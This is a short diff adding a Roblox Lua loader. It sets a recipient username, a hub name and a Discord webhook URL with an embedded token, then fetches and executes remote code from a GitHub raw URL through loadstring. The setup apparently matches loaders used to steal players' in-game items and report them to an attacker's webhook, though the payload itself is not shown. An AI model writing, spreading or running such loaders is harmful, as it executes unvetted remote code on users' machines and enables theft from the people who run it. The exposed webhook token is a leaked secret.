@@ -1,0 +1,5 @@
+_G.Username = "declancanningalt"
+_G.HubName = "DK scripts"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1099473161730396220/KYnfRL4zQCVGsbT4TSmHDvuOqghNRoS09pcERyj8u5whCnDCXw-a7rk1aCBIADBwbdD1"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
